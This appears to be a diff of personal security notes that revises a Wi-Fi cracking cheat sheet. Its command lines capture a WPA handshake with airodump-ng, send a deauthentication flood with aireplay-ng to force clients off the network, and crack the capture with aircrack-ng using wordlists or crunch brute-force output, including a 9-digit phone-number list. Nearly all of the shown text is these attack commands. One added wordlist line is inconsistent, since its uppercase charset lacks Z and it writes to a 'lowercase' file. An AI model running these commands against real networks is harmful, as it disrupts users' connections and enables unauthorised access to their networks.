@@ -316,13 +316,18 @@ to test this use the following commands\
 \
 /////////////check card supports packet injection\
 **##### terminal 1: airodump-ng wlan0\
-**##### terminal 1: airodump-ng -c 2 -w packetcapture -d 00:00:00:00:00:00 wlan0\
-**##### terminal 2: aireplay-ng --deauth -a 00:00:00:00:00:00 -c 00:00:00:00:00:00 wlan0\
-**##### terminal 3: aircrack-ng packetcapture.pcap -w passwords.txt\
+**##### terminal 1: airodump-ng -c 2 -w packetcapture -d AA:AA:AA:AA:AA:AA wlan0\
+**##### terminal 2: aireplay-ng --deauth 100 -a AA:AA:AA:AA:AA:AA -c 00:00:00:00:00:00 wlan0\
+**##### terminal 3: aircrack-ng packetcapture-01.cap -w passwords.txt\
 \
 ////Aircrack wifi crack\
-crunch 8 8 "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz" -t @@@@@@@@ | aircrack-ng packetcapture.cap -b AA:AA:AA:AA:AA:AA -w - | tee
-
+crunch 8 8 "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz" -t @@@@@@@@ | aircrack-ng packetcapture-01.cap -b AA:AA:AA:AA:AA:AA -w - | tee\
+\
+////Aircrack Create Wordlists\
+crunch 8 8 "abcdefghijklmnopqrstuvwxyz" -t @@@@@@@@ | tee 8char_lowercase_ALPHA_wordlist.txt    #1.7TB file size\
+crunch 8 8 "ABCDEFGHIJKLMNOPQRSTUVWXY" -t @@@@@@@@ | tee 8char_lowercase_ALPHA_wordlist.txt    #1.7TB file size\
+crunch 9 9 "0123456789" -t @@@@@@@@@ | tee 9char_mobileno_wordlist.txt     #9GB file size\
+\
 \
 # SNORT RULES AND RUN
 /etc/snort/rules/local.rules
